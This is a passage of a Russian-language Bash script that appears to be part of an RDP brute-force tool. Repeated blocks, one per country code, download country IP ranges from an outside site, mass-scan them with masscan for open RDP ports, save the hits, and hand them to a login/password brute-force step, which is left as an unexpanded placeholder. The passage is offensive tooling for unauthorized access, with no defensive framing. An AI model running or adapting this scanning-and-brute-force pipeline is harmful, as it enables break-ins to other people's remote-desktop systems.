echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "137" ]; then
curl http://ipdiapazon.16mb.com/Non-spec.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "138" ]; then
curl http://ipdiapazon.16mb.com/Norfolk.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "139" ]; then
curl http://ipdiapazon.16mb.com/Northern.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "140" ]; then
curl http://ipdiapazon.16mb.com/Norway.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "141" ]; then
curl http://ipdiapazon.16mb.com/Oman.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "142" ]; then
curl http://ipdiapazon.16mb.com/Pakistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "143" ]; then
curl http://ipdiapazon.16mb.com/Palau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "144" ]; then
curl http://ipdiapazon.16mb.com/Palestinian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "145" ]; then
curl http://ipdiapazon.16mb.com/Panama.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "146" ]; then
curl http://ipdiapazon.16mb.com/Papua_new_guinea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "147" ]; then
curl http://ipdiapazon.16mb.com/Paraguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "148" ]; then
curl http://ipdiapazon.16mb.com/Peru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "149" ]; then
curl http://ipdiapazon.16mb.com/Philippines.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "150" ]; then
curl http://ipdiapazon.16mb.com/Poland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "151" ]; then
curl http://ipdiapazon.16mb.com/Portugal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "152" ]; then
curl http://ipdiapazon.16mb.com/Puerto_rico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "153" ]; then
curl http://ipdiapazon.16mb.com/Qatar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "154" ]; then
curl http://ipdiapazon.16mb.com/Romania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
